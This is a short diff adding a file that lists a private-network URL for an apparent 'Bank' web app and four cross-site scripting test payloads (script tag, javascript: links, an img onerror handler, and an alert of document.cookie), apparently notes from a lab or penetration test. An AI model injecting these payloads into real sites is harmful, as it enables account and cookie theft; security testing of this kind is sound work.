@@ -1,0 +1,6 @@
+http://192.168.217.37:9999/Bank
+
+<script>alert('XSS1');</script>
+<a href="javascript:alert('XSS2')">XSS</a>
+<img src="#" onerror="alert('XSS3')">
+<a href="javascript:alert(document.cookie);">XSS4</a>
